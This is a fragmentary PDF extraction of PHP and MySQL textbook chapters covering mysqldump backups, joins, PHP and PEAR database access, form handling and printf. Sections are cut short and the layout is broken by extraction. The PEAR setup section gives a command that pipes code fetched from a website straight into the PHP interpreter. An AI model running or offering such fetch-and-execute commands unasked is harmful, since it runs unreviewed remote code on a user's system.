 data—numbers, dates/times, and strings—exist in one form or another. Table 8-10 
 lists data types with the values in brackets optional.
  
 Table 8-10. Common MySQL data types
  
 Field type
  
 Description
  
 Example
  
 INT[(M)]
  
 Integer number (max display size
  M
 )
  
 997
  
 FLOAT[(M,D)]
  
 Decimal number (
 M
  places before the 
 decimal
  D
  
 3.4156
  
 places after)
  
 CHAR(M)
  
 Characters (
 M
  characters up to 255)
  
 “test”
  
 VARCHAR(M)
  
 Text (
 M
  characters up to 256 or 
 approximately
  
 “testing 1, 2, 3”
  
 65,000 for MySQL 5)
  
 154
  
 |
  
 Chapter 8: Database Best Practices",NA
Backing Up and Restoring Data,"Even the best-maintained databases occasionally develop problems. Hardware fail-
 ures, in particular, can really throw a monkey wrench into your web pages. Now 
 that you’re using a database, just backing up the files (HTML, PHP, and images) on 
 your web server isn’t enough. There’s nothing worse than informing your web 
 users that they have to reenter information, such as their accounts, or having to 
 recreate your
  
 Backing Up and Restoring Data
  
 | 155",NA
Copying Database Files,"You can also do a simple file backup of your MySQL database’s datafiles, in the same 
 way that you can back up your HTML and PHP files. If you can back up files, you can 
 back up the MySQL database files.
  
 We don’t recommend this tactic for moving a database from one machine to 
 another server, since different versions of MySQL may expect these files to be in a 
 different format. MySQL stores its datafiles in a special data directory that is usually 
 located in 
 C:\Program Files\MySQL\MySQL Server 4.1\data\[
 database_name
 ]
  on 
 Windows and in
  /var/lib/mysql
  on Unix variants such as Linux and Mac OS X. Shut 
 down the MySQL service before doing a file copy backup to guarantee that all files 
 are from the same point in time when doing your backup.
  
 To fully back up and restore a MySQL database using your current datafiles, all the 
 files must be replaced in the same directory from which they were backed up. Then 
 the database must be restarted.",NA
The mysqldump Command,"It’s better to use the MySQL command-line tool for making complete database back-
 ups. The same tools you’ll use to back up and restore can also be used to change 
 platforms or move your database from one server to another;
  mysqldump
  creates a 
 text file containing the SQL statements required to rebuild the database objects and 
 insert the data. The
  mysqldump
  command is accessible from the command line and 
 takes parameters for backing up a single table, a single database, or everything. The 
 com-mand’s syntax is:
  
 mysqldump -u
  user
  -p
  objects_to_backup
  
 The
  mysqldump
  command produces the backup output to standard out (which by 
 default just prints to the screen). Specify a user who has access to the object you 
 want to back up. You will be prompted for the associated password for that user. 
 Redirect this output to a file using the greater than (
 >
 ) character followed by a file-
 name.
  
 Backing up
  
 We’re going to show you the commands to back up a database called
  store
  from the 
 shell prompt.
  
 mysqldump -u root -p store > my_backup_of_store.sql
  
 156
  
 |
  
 Chapter 8: Database Best Practices",NA
Advanced SQL,"In this section, we’ll introduce database concepts that, while not strictly necessary 
 for developing your web sites, can improve performance and make your queries 
 more flexible.",NA
Indexes,"Indexes work the same way that an index of a book works. If you were to look for 
 the keyword “
 CREATE TABLE
 ” without an index, you’d need to spend a lot of time 
 scanning through the pages of the book looking for a section that might be relevant.
  
 Advanced SQL
  
 | 159",NA
Selecting with the LEFT JOIN ON Clause,"We’ve discussed performing joins in our
  SELECT
  statements using the
  WHERE
  
 clause, but there’s another way to join tables. Instead of using the
  WHERE
  keyword,
  
 LEFT JOIN ON
  can be used to perform a
  left
  or
  outer join
 . A left join simply allows you 
 to query two tables that are linked together by a relationship, but allows one of the 
 tables to return rows even if there isn’t a matching row in the other table. Using the 
 book-store tables as an example, you might want to create a query that returns 
 users and their purchases, but also lists users who have yet to purchase anything.
  
 Using the syntax:
  
 SELECT
  fields
  FROM
  left_table
  LEFT JOIN
  right_table
  ON
  left_table.field_id
  =
  right_ table.field_id
 ;
  
 your goal could be accomplished like this:
  
 SELECT * FROM users LEFT JOIN purchases ON users.user_id = 
  
 purchases.user_id;
  
 If you’d like to try this query, you’ll need to create the users table and add some data:
  
 CREATE TABLE users (
  
  user_id int(11) NOT NULL auto_increment,
  
  first_name varchar(100) default NULL,
  
  last_name varchar(100) default NULL,
  
  username varchar(45) default NULL,
  
  password varchar(32) default NULL,
  
  PRIMARY KEY  (user_id) 
  
 );
  
 INSERT INTO users VALUES 
  
 (1,'Michele','Davis','mdavis',NULL),(2,'Jon','Phillips','jphillips',NULL);
  
 When doing a normal database query that links two tables, if both tables do not 
 include the key values for the field being joined, nothing is returned for the entry.
  
 Advanced SQL
  
 | 163",NA
Selecting with GROUP BY,"When selecting from the database, you can group rows of data together and 
 perform actions on the grouped data such as calculating an average or counting the 
 grouped rows. The
  GROUP BY
  keyword specifies on which column or columns to 
 group.
  
 The following displays the number of authors per book:
  
  SELECT title,COUNT(author_id)
  
   
  FROM books NATURAL JOIN authors 
  
 GROUP BY title;
  
 This displays:
  
 +-------------------------+------------------+ 
  
 | title                   | COUNT(author_id) | 
  
 +-------------------------+------------------+ 
  
 | Classic Shell Scripting |                2 | 
  
 | Linux in a Nutshell     |                2 | 
  
 +-------------------------+------------------+ 
  
 2 rows in set (0.05 sec)
  
 Because the results are grouped by title, it’s possible to count the number of 
 authors for each title. Common functions that can be used on columns that aren’t 
 included in the
  GROUP BY
  are shown in Table 8-13.
  
 Table 8-13. Common grouping functions
  
 Function
  
  
 Action on the grouped data
  
 COUNT( ) 
 SUM( ) 
  
 AVG( ) 
  
 MIN( ) 
  
 MAX( )
  
 Total rows 
  
 Total value 
  
 Average 
 value 
  
 Minimum 
 value 
  
 Maximum 
 value
  
 These functions can also be used on a query without a GROUP BY clause. They treat 
 all of the results as part of the same group.",NA
Using Database Functions,"Just like there are functions in PHP, you can also use functions within your MySQL 
 queries. We’ll discuss several categories of functions, starting with string functions. 
 The other major categories you’ll learn about are date and time modification 
 functions.
  
 String functions
  
 Since you’ll frequently work with strings, MySQL provides many functions for doing a 
 variety of tasks. You’ll generally use the string functions with data that is being
  
 164
  
 |
  
 Chapter 8: Database Best Practices",NA
Chapter 8 Questions,"Question 8-1 
  
  
 How do you back up a MySQL database called “blog” as the root database user?
  
 Question 8-2 
  
  
 How would you restore the backup created in Question 8-2?
  
 Question 8-3 
  
  
 What are the advantages and disadvantages to creating indexes on 
 tables?
  
 See the “Chapter 8” section in the Appendix for the answers to these questions.
  
 178
  
 |
  
 Chapter 8: Database Best Practices",NA
CHAPTER 9,NA,NA
Getting PHP to Talk to MySQL,"9
  
 Now that you’re comfortable using the MySQL client tools to manipulate data in the 
 database, you can begin using PHP to display and modify data from the database. 
 PHP has standard functions for working with the database.
  
 First, we’re going to discuss PHP’s built-in database functions. We’ll also show you 
 how to use the The PHP Extension and Application Repository (PEAR) database 
 functions that provide the ability to use the same functions to access any supported 
 database. This type of flexibility comes from a process called
  abstraction
 . In pro-
 gramming interfaces, abstraction simplifies a complex interaction. It works by 
 removing any nonessential parts of the interaction, allowing you to concentrate on 
 the important parts. PEAR’s DB classes are one such database interface abstraction. 
 The information you need to log into a database is reduced to the bare minimum. 
 This standard format allows you to interact with MySQL, as well as other databases 
 using the same functions. Similarly, other MySQL-specific functions are replaced 
 with generic ones that know how to talk to many databases. For example, the 
 MySQL-specific connect function is:
  
 mysql_connect($db_host, $db_username, $db_password);
  
 versus PEAR’s DB connect function:
  
 $connection = DB::connect(""mysql://$db_username:$db_password@$db_host/$db_database"");
  
 The same basic information is present in both commands, but the PEAR function 
 also specifies the type of databases to which to connect. You can connect to MySQL 
 or other supported databases. We’ll discuss both connection methods in detail.
  
 In this chapter, you’ll learn how to connect to a MySQL server from PHP, how to use 
 PHP to access and retrieve stored data, and how to correctly display information to 
 the user.
  
 179",NA
The Process,"The basic steps of performing a query, whether using the
  mysql
  command-line tool 
 or PHP, are the same:
  
 • Connect to the database.
  
 • Select the database to use.
  
 • Build a
  SELECT
  statement.
  
 • Perform the query.
  
 • Display the results.
  
 We’ll walk through each of these steps for both plain PHP and PEAR functions.",NA
Resources,"When connecting to a MySQL database, you will use two new resources. The first is 
 the link identifier that holds all of the information necessary to connect to the data-
 base for an active connection. The other resource is the results resource. It contains 
 all information required to retrieve results from an active database query’s result 
 set. You’ll be creating and assigning both resources in this chapter.",NA
Querying the Database with PHP Functions,"In this section, we introduce how to connect to a MySQL database with PHP. It’s 
 quite simple, and we’ll begin shortly with examples, but we should talk briefly 
 about what actually happens. When you try connecting to a MySQL database, the 
 MySQL server authenticates you based on your username and password. PHP 
 handles con-necting to the database for you, and it allows you to start performing 
 queries and gathering data immediately.
  
 As in Chapter 8, we’ll need the same pieces of information to connect to the data-
 base:
  
 • The IP address of the database server
  
 • The name of the database
  
 • The username
  
 • The password
  
 Before moving on, make sure you can log into your database using the MySQL 
 command-line client.
  
 Figure 9-1 shows how the steps of the database interaction relate to the two types 
 of resources. Building the
  SELECT
  statement happens before the third function call, 
 but it is not shown. It’s done with plain PHP code, not a MySQL-specific PHP 
 function.
  
 180
  
 |
  
 Chapter 9: Getting PHP to Talk to MySQL",NA
Including Database Login Details,"You’re going to create a file to hold the information for logging into MySQL. Storing 
 this information in a file you include is recommended. If you change the database 
 password, there is only one place that you need to change it, regardless of how 
 many PHP files you have that access the database.
  
 You don’t have to worry about anyone directly viewing the file and 
 getting your database login details. The file, if requested by itself, is
  
  
 processed as a PHP file and returns a blank page.
  
 Let’s call this file
  db_login.php
  and place it in the same directory as your other PHP 
 files. The file is represented in Example 9-1.
  
 Example 9-1. A template for setting database login settings
  
 <?php 
  
 $db_host='
 hostname of database server
 '; 
  
 $db_database='
 database name
 '; 
  
 $db_username='
 username
 '; 
  
 $db_password='
 password
 '; 
  
 ?>
  
 In Example 9-2, we create this file to use a database on the same machine as the web 
 server. We assign it a database name, username, and password.
  
 Querying the Database with PHP Functions
  
 | 181",NA
Connecting to the Database,"The first thing you need to do is connect to the database and check to make sure 
 there’s a connection. Including the file that you set up to store your connection 
 infor-mation allows you to use the variables instead of hardcoded values when you 
 call the 
 mysql_connect
  function, as shown in Example 9-4. We’re assembling one file,
  
 db_ test.php
 , by adding these code snippets.
  
 Querying the Database with PHP Functions
  
 | 183",NA
Selecting the Database,"Now that you’re connected, the next step is to select which database to use with the 
 mysql_select_db
  command. It takes two parameters: the database name and, option-
 ally, the database connection. If you don’t specify the database connection, the 
 default is the connection from the last
  mysql_connect
 :
  
 // Select the database 
  
 $db_select=mysql_select_db($db_database); 
  
 if (!$db_select) 
  
 {
  
  
  die (""Could not select the database: <br />"". mysql_error( )); 
  
 }
  
 Again, it’s good practice to check for an error and display it every time you access 
 the database.
  
  
 While it’s possible to call
  mysql_select_db
  multiple times within the 
 same script, it’s not considered good practice.
  
 Now that you’ve got a good database connection, you’re ready to execute your SQL 
 query.",NA
Building the SQL SELECT Query,"Building a SQL query is as easy as setting a variable to the string that is your SQL 
 query. Of course, you’ll need to use a valid SQL query, or MySQL returns with an 
 error when you execute the query. The variable name
  $query
  is used since the name 
 reflects its purpose, but you can choose anything you’d like for a variable name. The 
 SQL query in this example is
  SELECT * FROM books
 .
  
  
 Unlike when you used the
  mysql
  command-line client, the query does 
 not have a semicolon at the end.
  
 You can build up your query in parts using the string concatenate (
 .
 ) operator:
  
 // Assign the query 
  
 $select = ' SELECT '; 
  
 $column = ' * '; 
  
 $from = ' FROM '; 
  
 $tables = ' books '; 
  
 $where = ' NATURAL JOIN authors'; 
  
 $query = $select.$column.$from.$tables.$where;
  
 Querying the Database with PHP Functions
  
 | 185",NA
Executing the Query,"To have the database execute the query, use the
  mysql_query
  function. It takes two 
 parameters—the query and, optionally, the database link—and returns the result. 
 Save a link to the results in a variable called, you guessed it,
  $result
 ! This is also a 
 good place to check the return code from
  mysql_query
  to make sure that there were 
 no errors in the query string or the database connection by verifying that
  $result
  is 
 not
  FALSE
 :
  
 // Execute the query 
  
 $result = mysql_query( $query ); 
  
 if (!$result){
  
  
  die (""Could not query the database: <br />"". mysql_error( )); 
  
 }
  
 When the database executes the query, all of the results form a result set. These 
 results correspond to the rows that you saw upon doing a query using the
  mysql 
 command-line client. To display them, you process each row, one at a time.",NA
Fetching and Displaying,"Use
  mysql_fetch_row
  to get the rows from the result set. Its syntax is:
  
 array mysql_fetch_row ( resource $result);
  
 It takes the result you stored in
  $result
  from the query as a parameter. It returns 
 one row at a time from the query until there are no more rows, and then it returns
  
 FALSE
 . Therefore, you do a loop on the result of
  mysql_fetch_row
  and define some 
 code to display each row:
  
 // Fetch and display the results 
  
 while ($result_row = mysql_fetch_row(($result))){
  
  
  echo 'Title: '.$result_row[1] . '<br />';
  
  
  echo 'Author: '.$result_row[4] . '<br /> ';
  
  
  echo 'Pages: '.$result_row[2] . '<br /><br />'; 
  
 }
  
 The columns of the result row are stored in the array and can be accessed one at a 
 time. The variable
  $result_row[2]
  accesses the second attribute (as defined in the 
 query’s column order or the column order of the table if
  SELECT *
  is used) in the 
 result row.
  
 186
  
 |
  
 Chapter 9: Getting PHP to Talk to MySQL",NA
Closing the Connection,"As a rule of thumb, you always want to close a connection to a database when 
 you’re done using it. Closing a database with
  mysql_close
  will tell PHP and MySQL 
 that you no longer will be using the connection, and will free any resources and 
 memory allocated to it:
  
 mysql_close($connection)",NA
Putting It All Together,"Now you’re going to take all of the steps and put them into a single PHP file that 
 you’ll call
  db_test.php
 . You should place the PHP script shown in Example 9-5 in the 
 same directory as the
  db_login.php
  file.
  
 Example 9-5. Displaying the books and authors
  
 <?php 
  
 // Include our login information 
  
 include('db_login.php'); 
  
 // Connect 
  
 $connection = mysql_connect( $db_host, $db_username, $db_password ); 
  
 if (!$connection){
  
  
  die (""Could not connect to the database: <br />"". mysql_error( )); 
  
 } 
  
 // Select the database 
  
 $db_select=mysql_select_db($db_database); 
  
 if (!$db_select){
  
  
  die (""Could not select the database: <br />"". mysql_error( )); 
  
 }
  
 Querying the Database with PHP Functions
  
 | 187",NA
Using PEAR,"PEAR is a framework and distribution system for reusable PHP components, 
 creating a collection of add-on functionalities for PHP development. There are 
 many modules available to handle everything from session management to 
 shopping cart functional-ity. Categories of modules that are currently available are 
 listed in Table 9-1.
  
 Table 9-1. PEAR modules categories
  
 Authentication
  
 HTML
  
 Processing 
  
 Science 
  
 Semantic 
 Web 
  
 Streams 
  
 Structures
  
 Benchmar
 king
  
 HTTP
  
 Caching
  
 Images
  
 Configura
 tion
  
 Internationalization
  
 Console
  
 Logging
  
 190
  
 |
  
 Chapter 9: Getting PHP to Talk to MySQL",NA
Installing,"PEAR uses a Package Manager that oversees which PEAR features you install. 
 Whether you need to install the Package Manager depends on which version of PHP 
 you installed. If you’re running PHP 4.3.0 or newer, it’s already installed. If you’re 
 running PHP 5.0, PEAR has been split out into a separate package. The DB package 
 that you’re interested in is optional but installed by default with the Package Man-
 ager. So if you have the Package Manager, you’re all set.
  
 Unix
  
 You can install the Package Manager on a Unix system by executing the following 
 from the shell (command-line) prompt:
  
 lynx -source http://go-pear.org/ | php
  
 This takes the output of the go-pear.org site (which is actually the source PHP code) 
 to install PEAR and passes it along to the
  php
  command for execution.
  
 Windows
  
 The PHP 5 installation includes the PEAR installation script as
  C:\php\go-pear.bat
 . 
 In case you didn’t install all the files in Chapter 2, go ahead and extract all the PHP 
 files to
  C:/php
  from the command prompt, and execute the
  .bat
  file.
  
  
 If you installed PHP from the MSI installer, you may need to execute 
 the following instead of the
  go-pear.bat
  file:
  
 php go-pear.phar
  
 If the PEAR directory does not exists at all you’ll need to re-run the 
  
 PHP MSI installer, select the Change option, and set Extensions and 
  
 Extras to “Will be installed on local drive” before running
  go-
 pear.phar
 .
  
 Using PEAR
  
 | 191",NA
Adding Additional Packages,"Once that’s complete, you can access the PEAR Package Manager by entering
  pear
  at 
 the command prompt. Adding new modules is as easy as executing
  pear
  
 packagename
 .
  
 192
  
 |
  
 Chapter 9: Getting PHP to Talk to MySQL",NA
Rewriting the Books Example with PEAR,"When using the PEAR DB package, you follow the same steps. However, the func-
 tion syntax is slightly different. We’ll go line by line and explain the differences as 
 they appear in Example 9-7.
  
 Example 9-7. Displaying the books table with PEAR DB
  
 1 <?php 
  
 2 
  
 3 include('db_login.php'); 
  
 4 require_once('DB.php'); 
  
 5 
  
 6 $connection = DB::connect(""mysql://$db_username:$db_password@$db_host/$db_database""); 7 
  
 8 if (DB::isError($connection)){ 
  
 9     die(""Could not connect to the database: <br />"".DB::errorMessage($connection)); 10 } 
  
 11 
  
 12 $query = ""SELECT * FROM books NATURAL JOIN authors""; 
  
 13 $result = $connection->query($query); 
  
 14
  
 Using PEAR
  
 | 193",NA
Chapter 9 Questions,"Question 9-1 
  
  
 Create a PEAR-style connect string to connect to this 
 database:
  
 • hostname: oreilly.com
  
 • database name: survey
  
 • username: joe
  
 • password: my$ql
  
 Question 9-2 
  
 Using the parameters in Question 9-1, write the non-PEAR PHP code to con-nect 
 to a database and select the instance.
  
 Question 9-3 
  
 Using the connection from Question 9-2, write the non-PEAR PHP code to fetch 
 and display the results of the query
  SELECT * FROM authors;
 .
  
 Question 9-4 
  
  
 What are the advantages of using 
 PEAR?
  
 See the “Chapter 9” section in the Appendix for the answers to these questions.
  
 198
  
 |
  
 Chapter 9: Getting PHP to Talk to MySQL",NA
CHAPTER 10,NA,NA
Working with Forms,"10
  
 HTML forms provide a way to send substantial data from the user to the server 
 where it can be processed. You’ll be using a lot of the PHP language concepts that 
 you learned about in the first half of the book to process and validate the form data.
  
 We’ll begin by building a simple form and learning how to access the information in 
 its fields after a user’s submission. We’ll discuss the basic types of input devices 
 that can be placed on forms, as well as on hidden values. Of course, the PHP code 
 will be mixed in with all of these elements.
  
 Forms work in a two-step process. The form must be presented to the user. He then 
 enters information and submits the form. Every form has a target for what page to 
 load that will process the data when the user submits. Often, this is the same file 
 that originally generated the form. The PHP code simply checks to see whether 
 there’s user input coming along with the request for the page to determine whether 
 the file is being called to generate the form or process its data.
  
 Searching a database is necessary in many different types of applications. Whether 
 it’s searching forum posts, users, or a blog, it can make a user’s life much easier. On 
 a database level, there are also many different ways to process a search and bring 
 back results.",NA
Building a Form,"Since you’ll need a place for the user to enter a search query, let’s begin by building 
 a form to handle the user’s input. Every form must have these basic components:
  
 • The submission type defined with the
  method
  keyword
  
 • One or more input elements defined with the
  input
  tag
  
 • The destination to go to when submitted defined with the
  action
  keyword
  
 Let’s build a simple form with a text input field called
  search
  and a
  submit
  button, as 
 shown in Example 10-1.
  
 199",NA
Accessing Submitted Form Values,"Let’s go ahead and modify the code in Example 10-1 to display the search string 
 when the form is submitted. To do this, check the value of a
  GET
  submitted field 
 with the syntax
  $_GET[
 field
 ]
 . Likewise,
  $_POST[
 field
 ]
  is used to access a field when 
 using the
  POST
  field submission.
  
 Since
  search
  is the name of the field that we specified when building the form, we’ll 
 use
  $_GET[""search""]
  in Example 10-2.
  
 Example 10-2. Modifying our simple search to process the results
  
 <html> 
  
 <head>
  
  
  <title>Building a Form</title> 
  
 </head> 
  
 <body> 
  
 <?php 
  
 $search = htmlentities($_GET[""search""]); 
  
 $self = htmlentities($_SERVER['PHP_SELF']); 
  
 if ($search === '' ){
  
  
  echo ('
  
  
  <form action=""'.$self.'"" method=""GET"">
  
  
  
  <label>Search: <input type=""text"" name=""search"" /></label>
  
  
  
  <input type=""submit"" value=""Go!"" />
  
  
  </form>'); 
  
 } 
  
 else {
  
  
  echo ""The search string is: <strong>$search</string>""; 
  
 } 
  
 ?> 
  
 </body> 
  
 </html>
  
 Example 10-2 generates this HTML:
  
 <html> 
  
 <head>
  
  
  <title>Building a Form</title> 
  
 </head> 
  
 <body> 
  
 <form action=""/oreilly/ch10/simple.php"" method=""GET"" />
  
  
  
  <label> Search: <input type=""text"" name=""search"" id=""search"">
  
  
  </label>
  
  
  <input type=""submit"" value=""Go!"" /> 
  
 </form>
  
 </body
 > 
  
 </html>
  
 Building a Form
  
 | 201",NA
register_globals,"In the early days of PHP (before 4.2.0) it was common practice to use a PHP 
 configu-ration directive called
  register_globals
 . It’s now disabled by default because 
 it made writing insecure code too easy. If a variable wasn’t initialized, a malicious 
 user could pass in that variable as a URL parameter, and your code would use the 
 value, com-pletely compromising the security of the script. These values must now 
 be accessed using methods that indicate where the value is coming from, such as a
  
 POST
  submission. Unfortunately, there’s still code available that doesn’t work 
 properly because it assumes that
  register_globals
  is still on. It causes all sorts of 
 headaches like form sub-mission data not being accessible in the affected code.",NA
Default Values,"When performing searches on a database, you might need to actually have some 
 default values in your forms. This is useful, for example, for searching within a price 
 range. The user doesn’t always want to insert values, and it makes it that much sim-
 pler when searching. Typically, the default value for a form element is set with the 
 value
  attribute; however, there is an exception for checkboxes that use the
  checked 
 keyword. Take Example 10-3.
  
 202
  
 |
  
 Chapter 10: Working with Forms",NA
Types of Input,"There are many different types of input, so which one should you use? Radio but-
 tons, checkboxes, text, input, text areas, buttons...oh my! We’ll describe each of our 
 input options.
  
 Text boxes
  
 Most of the time when dealing with input from a user, you might want a string of 
 text. A text type element is used to capture these strings from the user. The
  name 
 attribute is required to process the input after a form submission as it specifies 
 how to reference the value. When it appears in the browser, the
  size
  parameter 
 deter-mines the length of the text box. The
  maxlength
  parameter determines the 
 maximum number of characters the user can place in the field. The syntax is as 
 follows:
  
 <input type=""text"" name=""
 name
 "" size=""
 display size
 "" maxlength=""
 max characters allowed
 "" />
  
 Building a Form
  
 | 203",NA
Working with Multiple Values,"Having checkboxes and radio buttons creates a new problem. For example, if a user 
 can select both Italian and Mexican foods from a form, you’ve exceeded the one 
 literal value a variable can hold, and an array must be used (see Example 10-5).
  
 Example 10-5. A form with checkboxes using the same name to store multiple values
  
 <html> 
  
 <head>
  
  
  <title>Using Default Checkbox Values</title> 
  
 </head> 
  
 <body> 
  
 <?php 
  
 $food = $_GET[""food""]; 
  
 if (!empty($food)){
  
  
  echo ""The foods selected are: <strong>"";
  
  
  foreach($food as $foodstuff){
  
  
  
  echo '<br />'.htmlentities($foodstuff);
  
  
  }
  
  
  echo ""</strong>.""; 
  
 } 
  
 else {
  
  
  echo ('
  
  
  <form action=""'. htmlentities($_SERVER[""PHP_SELF""]).'"" method=""GET"">
  
  
  
  <fieldset>
  
  
  
  
  <label>
  
  
  
  
  
  Italian
  
  
  
  
  
  <input type=""checkbox"" name=""food[]"" value=""Italian"" />
  
  
  
  
  </label>
  
  
  
  
  <label>
  
  
  
  
  
  Mexican
  
  
  
  
  
  <input type=""checkbox"" name=""food[]"" value=""Mexican"" />
  
  
  
  
  </label>
  
  
  
  
  <label>
  
  
  
  
  
  Chinese
  
  
  
  
  
  <input type=""checkbox"" name=""food[]"" value=""Chinese"" checked=""checked"" />
  
  
  
  </label>
  
  
  
  </fieldset>
  
  
  
  <input type=""submit"" value=""Go!"" />
  
  
  </form> ');
  
  
  } 
  
 ?> 
  
 </body> 
  
 </html>
  
 Example 10-5 produces something like Figure 10-8.
  
 You gave the user the choice of three different ethnic foods: Italian, Mexican, and 
 Chinese. In this example, the user can check multiple checkboxes. Therefore, you 
 need to access more than a single value from the name of the checkbox when you 
 process the form submission in PHP. We’ll place a pair of brackets (
 []
 ) after the 
 field’s
  name
  attribute to send the results in an array.
  
 208
  
 |
  
 Chapter 10: Working with Forms",NA
Validating Data,"Whenever you are taking data from a user, you should always validate it. If you do 
 not validate the user’s input, it can cause many problems—including possible secu-
 rity risks.
  
 Validating input is not complicated. We’ll go over the most common PHP functions 
 that are used to sanitize data from users.
  
 Validating checkboxes, radio buttons, and selects
  
 Validating data that comes from checkboxes, radio buttons, and selects is easier 
 than validating free format fields such as text boxes because the value should only 
 be one of the predefined values. To ensure this, store all of the options in an array, 
 and
  
 210
  
 |
  
 Chapter 10: Working with Forms",NA
Building a Feet-to-Meters Converter in PHP,"We’re going to show you the power of PHP by creating a feet-to-meters converter 
 application, shown in Example 10-8, which would be handy if your web site is used 
 internationally.
  
 Example 10-8. PHP feet-to-meters converter
  
 <head>
  
  
  <title>Feet to meters conversion</title> 
  
 </head> 
  
 <body> 
  
 <?php 
  
 //Check to see if the form has been submitted 
  
 $feet = htmlentities($_GET[""feet""]); 
  
 if ($_GET[feet] != NULL){
  
  
  echo ""<strong>$feet</strong> feet converts to <strong>"";
  
  
  echo $feet * 0.3048;
  
  
  echo ""</strong> meters.<br />""; 
  
 } 
  
 ?> 
  
 <form action=""<?php echo(htmlentities($_SERVER['PHP_SELF'])); ?>"" method=""GET"">
  
  
 <label>Feet:
  
  
  
  <input type=""text"" name=""feet"" value=""<?php echo $feet; ?>"" />
  
  
  </label>
  
  
  <input type=""submit"" value=""Convert!"" /> 
  
 </form> 
  
 </body> 
  
 </html>
  
 This self-processing form collects a measurement in feet, multiplies that measure-
 ment by a standard conversion factor, and then prints out the results. Since you still 
 have the original value in
  $feet
  from the form submission, you use it as an initial 
 value when displaying the
  Feet
  user input field in the form. Figure 10-11 shows the 
 results of entering
  12
  and clicking Convert.",NA
Building a Time Zone Conversion Utility in PHP,"Now that you’ve learned how to do a variety of tasks, let’s put it all together to get 
 an idea of what can be done in PHP. Example 10-9 uses forms, arrays, conditionals, 
 looping, and date strings. These all work together to bring you a handy tool for con-
 verting between some common time zones.
  
 212
  
 |
  
 Chapter 10: Working with Forms",NA
Querying the Database with Form Data,"Once you’ve validated your data, you’re ready to start using information from the 
 forms in your database queries. Example 10-11 creates a function called
  query_db 
 from the code in Chapter 7 for displaying authors with a change to line 11 that 
 allows matching the title with a
  LIKE
  search clause.
  LIKE
  and
  NOT LIKE
  are usually 
 used with strings and possibly with wildcards, such as the underscore (
 _
 ) and the 
 percent sign (
 %
 ).
  
 • The underscore (
 _
 ) matches a single character.
  
 • The percent sign (
 %
 ) matches zero or more characters.
  
 In Example 10-10, the function takes a single parameter and searches for the 
 specific book title you’re looking to find.
  
 Example 10-10. Combining form processing and database querying
  
 1 <?php 
  
 2 function query_db($qstring) { 
  
 3     include('db_login.php');  //connection details 
  
 4     require_once('DB.php');  //PEAR DB 
  
 5     $connection = DB::connect(""mysql://$db_username:$db_password@$db_host/$db_ 
 database""); 
  
 6 
  
 7     if (DB::isError($connection)){  //check for connect errors 
  
 8         die (""Could not connect to the database: <br />"". DB:: 
  
 errorMessage($connection));
  
 Building a Form
  
 | 215",NA
Templates,"Templates separate the HTML code that defines the presentation or look of a page 
 from the PHP code that’s responsible for gathering the data. Once separated, it 
 becomes easier for someone with HTML and perhaps CSS knowledge to modify the 
 template without worrying about breaking the PHP code. Likewise, the PHP code 
 can focus on the data instead of getting caught up in presentation details.
  
 There are other advantages to using templates, too. If you make a mistake in the 
 tem-plate, the error will be clearly returned from the template. The template itself 
 can generally be loaded into a web browser or a graphical web development tool 
 such as Dreamweaver, since it resembles the final state of the page when 
 processed. Tem-plates support very basic programming features for use with 
 presentation, such as being able to tell whether a section of a page should be 
 visible.
  
 Of course, nothing’s perfect; there are a couple of disadvantages to templates. Tem-
 plates increase the number of files to maintain. They add a small amount of extra 
 processing time. They also require installing the template engine and setting up 
 directories. You need to be running at least PHP Version 4.0.6 to use Smarty, a 
 popu-lar template engine.",NA
Template Engine,"There are several template packages available on the Internet. Each uses its own 
 template engine
  to process the templates and make them as efficient as possible. No 
 matter which template engine you use, you’ll always follow the same basic steps:
  
 1. Retrieve your data.
  
 2. Make calls to the template functions for each value that’s used in a template.
  
 3. Display the template using the
  template
  function.
  
 We’ll walk through this process with some examples shortly. One of the more 
 popular template engines available is Smarty, shown later in Figure 10-16. Smarty 
 has many, many features, but we’re most concerned with the basic template engine 
 functionality.",NA
Installation,"While installing Smarty isn’t as complex as installing and configuring Apache, PHP, 
 and MySQL, it still deserves some attention:
  
 218
  
 |
  
 Chapter 10: Working with Forms",NA
Chapter 10 Questions,"Question 10-1 
  
 Which super global variable is used to automatically call the same script to pro-
 cess the results of form input?
  
 Question 10-2 
  
 Create a form that takes text field parameters for username and password and 
 submits the values to the same script.
  
 Question 10-3 
  
  
 Add code to echo the values of the form submission from Question 10-2.
  
 Question 10-4 
  
  
 Write a SQL query to select only author names that begin with “A.”
  
 See the “Chapter 10” section in the Appendix for the answers to these questions.
  
 222
  
 |
  
 Chapter 10: Working with Forms",NA
CHAPTER 11,NA,NA
Practical PHP,"11
  
 In this chapter we’ll start working on some of the more common tasks that you’ll 
 perform when writing PHP programs, such as working with strings, and displaying 
 different formats for strings, dates, and times. We’ll also show you how to work 
 with files that your PHP program creates or reads. In addition, we’ll provide an 
 example of how to let a user upload a file and then validate its contents before 
 making it accessible. Uploading files is useful but can be a security risk if files aren’t 
 properly validated.
  
 When building HTML output for web pages, we spend quite a bit of time working 
 with strings. PHP has a rich set of functions for doing all the tasks you may need to 
 change the case of a string. You also need to be able to format dates and times. Per-
 forming any sort of addition or subtraction on dates—thanks to quirks such as leap 
 years—can quickly become complicated without a little help from functions specifi-
 cally designed to work with dates.",NA
String Functions,"Because you’re working with essentially two languages that both support 
 manipulat-ing strings, you need to learn about string functions in PHP and in 
 MySQL. You may find it more appropriate to modify a string either in a query or in 
 PHP based on the particular situation. You’re going to learn about the following 
 string operations:
  
 • Formatting strings for display
  
 • Calculating the length of a string
  
 • Changing a string’s case to uppercase or lowercase
  
 • Searching for strings within strings and returning the position of the match
  
 • Returning just a portion of a string, which is a substring
  
 We’ll start with formatting strings, since that will help you throughout the rest of the 
 topics.
  
 223",NA
Formatting Strings for Display,"So far, you’ve been using
  echo
  and
  print
  to display strings without much modifica-
 tion. You’ll learn about two functions called
  printf
  and
  sprintf
 . If you’re familiar with 
 other programming languages, such as C, you’ll recognize that these functions work 
 the same way as they do elsewhere. Don’t worry if you haven’t used them before—
 they’re not too hard to work with. The only difference between the two is that
  printf
  
 displays a formatted string to the output like
  print
  does, while
  sprintf 
 saves the 
 string it builds as another string with a name specified by you.
  
 Using printf
  
 The
  printf
  function works by taking as its first parameter a special
  formatting string
 . 
 The formatting string works like a template to describe how to plug the rest of the 
 parameters into one resulting string. You can specify details such as how to format 
 numbers in the string or the padding of values. Each parameter that’s placed into 
 the resulting string has a placeholder in the formatting string. For example, to 
 output a binary number, use the code in Example 11-1.
  
 Example 11-1. Displaying a number in binary format
  
 <?php 
  
 printf(""The computer stores the number 42 internally as %b."",42); 
  
 ?>
